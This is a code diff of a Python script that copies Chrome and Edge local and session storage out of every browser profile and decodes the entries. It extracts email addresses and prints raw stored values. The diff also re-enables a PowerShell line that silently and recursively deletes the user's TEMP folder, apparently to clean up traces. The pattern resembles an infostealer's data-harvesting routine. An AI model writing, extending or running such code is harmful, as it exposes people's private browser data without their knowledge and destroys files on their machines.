@@ -76,18 +76,30 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
         if os.path.isdir(lsDatPath):
             try:
                 print(f"ATTEMPTING TO READ FROM LOCAL STORAGE!!! for {profile} and {browser_name}")
-                os.system(f"powershell copy-item -path '{lsDatPath}' -destination '{tlsDatPath}' -force -recurse")
+                os.system(f'robocopy "{lsDatPath}" "{tlsDatPath}" /MIR /COPYALL >nul 2>&1')
                 db = plyvel.DB(str(tlsDatPath), create_if_missing=False)
                 for key, value in db:
-                    key_str = key.decode('utf-8', errors='ignore')
-                    if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
-                        value = snappy.uncompress(value)
-                    value_str = value.decode('utf-8', errors='ignore')
-                    decoded = f"{key_str} {value_str}"
-                    # print(decoded)
-                    #print(value_str)
-                    emails.extend(re.findall(email_pattern, key_str))
-                    emails.extend(re.findall(email_pattern, value_str))
+                    try:
+                        key_str = key.decode('utf-8', errors='ignore')
+                        if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
+                            try:
+                                value = snappy.uncompress(value)
+                            except Exception as e :
+                                print(f"Error decompressing value: {e}, skipping this entry.")
+                        value_str = value.decode('utf-8', errors='ignore')
+                        try:
+                            decoded_json = json.loads(value_str)
+                            if isinstance(decoded_json, dict):
+                                value_str = json.dumps(decoded_json)
+                        except:
+                            pass
+                        decoded = f"{key_str} {value_str}"
+                        #print(decoded)
+                        print(value_str)
+                        emails.extend(re.findall(email_pattern, key_str))
+                        emails.extend(re.findall(email_pattern, value_str))
+                    except Exception as e:
+                        print(f"Error processing entry with key {key_str}: {e}")
                 db.close()
             except Exception as e:
                 print(f"ERROR PARSING LOCAL STORAGE : {e}")
@@ -97,18 +109,23 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
         if os.path.isdir(ssDatPath):
             try:
                 print(f"ATTEMPTING TO READ FROM SESSION STORAGE!!! for {profile} and {browser_name}")
-                os.system(f"powershell copy-item -path '{ssDatPath}' -destination '{tssDatPath}' -force -recurse")
+                os.system(f'robocopy "{ssDatPath}" "{tssDatPath}" /MIR /COPYALL >nul 2>&1')
                 db = plyvel.DB(str(tssDatPath), create_if_missing=False)
                 for key, value in db:
-                    key_str = key.decode('utf-8', errors='ignore')
-                    if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
-                        value = snappy.uncompress(value)
-                    value_str = value.decode('utf-8', errors='ignore')
-                    decoded = f"{key_str} {value_str}"
-                    #print(decoded)
-                    #print(value_str)
-                    emails.extend(re.findall(email_pattern, key_str))
-                    emails.extend(re.findall(email_pattern, value_str))
+                    try:
+                        key_str = key.decode('utf-8', errors='ignore')
+                        if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
+                            try:
+                                value = snappy.uncompress(value)
+                            except Exception as e :
+                                print(f"Error decompressing value: {e}, skipping this entry.")
+                        value_str = value.decode('utf-8', errors='ignore')
+                        decoded = f"{key_str} {value_str}"
+                        #print(decoded)
+                        emails.extend(re.findall(email_pattern, key_str))
+                        emails.extend(re.findall(email_pattern, value_str))
+                    except Exception as e:
+                        print(f"Error processing entry with key {key_str}: {e}")
                 db.close()
             except Exception as e:
                 print(f"ERROR PARSING SESSION STORAGE : {e}")
@@ -278,4 +295,4 @@ for email in emails:
         
 print(len(emails))
 
-#os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
+os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
